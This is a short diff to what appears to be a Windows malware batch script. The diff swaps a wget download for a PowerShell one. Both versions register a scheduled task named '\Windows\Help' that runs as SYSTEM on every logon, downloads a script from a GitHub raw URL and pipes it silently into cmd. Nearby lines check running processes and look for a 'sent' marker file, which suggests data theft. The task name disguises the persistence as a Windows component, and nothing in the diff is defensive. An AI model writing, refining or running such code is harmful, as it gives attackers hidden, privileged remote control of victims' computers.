@@ -17,7 +17,7 @@ for %a in (%processList%) do (
         exit /b
     )
 )
-schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc onlogon /tn "\Windows\Help" /tr "%WINDIR%\System32\cmd.exe /c %ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/ns | cmd /Q /V:ON" /F
+schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc onlogon /tn "\Windows\Help" /tr "powershell.exe -NoProfile -Command "(Invoke-WebRequest 'https://raw.githubusercontent.com/pushop/0/0/0/ns' -UseBasicParsing).Content | cmd /Q /V:ON" /F
 
 if exist "%ProgramData%\sent" exit /b
 chcp 65001 > nul
